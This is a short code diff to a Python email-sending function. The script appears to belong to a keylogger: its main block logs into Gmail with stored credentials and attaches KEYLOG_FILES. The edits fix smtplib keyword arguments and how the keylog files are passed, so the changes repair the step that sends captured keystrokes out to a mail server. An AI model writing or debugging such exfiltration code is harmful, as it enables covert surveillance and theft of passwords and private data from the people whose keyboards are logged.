@@ -28,7 +28,8 @@ def send_email(sender,
                port=587,
                use_tls=True):
 
-    """Compose and send email with provided info and attachments.
+    """
+    Compose and send email with provided info and attachments.
 
     Args:
         sender (str): from name
@@ -44,6 +45,7 @@ def send_email(sender,
     """
 
     msg = MIMEMultipart()
+
     msg['From'] = sender
     msg['To'] = receiver # COMMASPACE.join(receiver)
     msg['Date'] = formatdate(localtime=True)
@@ -64,9 +66,9 @@ def send_email(sender,
         smtp = smtplib.SMTP_SSL(server, port)
     except:
         try:
-            smtp = smtplib.SMTP_SSL(server='smtp.gmail.com', port=465)
+            smtp = smtplib.SMTP_SSL(host='smtp.gmail.com', port=465)
         except:
-            smtp = smtplib.SMTP(server='smtp.gmail.com', port=587)
+            smtp = smtplib.SMTP(host='smtp.gmail.com', port=587)
 
     try:
         if use_tls: smtp.starttls()
@@ -89,5 +91,5 @@ if __name__ == '__main__':
                username=EMAIL_LOGIN_INFO['LOGIN']['USERNAME'],\
                password=EMAIL_LOGIN_INFO['LOGIN']['PASSWORD'],\
                server='smtp.gmail.com',\
-               files=[KEYLOG_FILES],\
+               files=KEYLOG_FILES,\
                port=465)
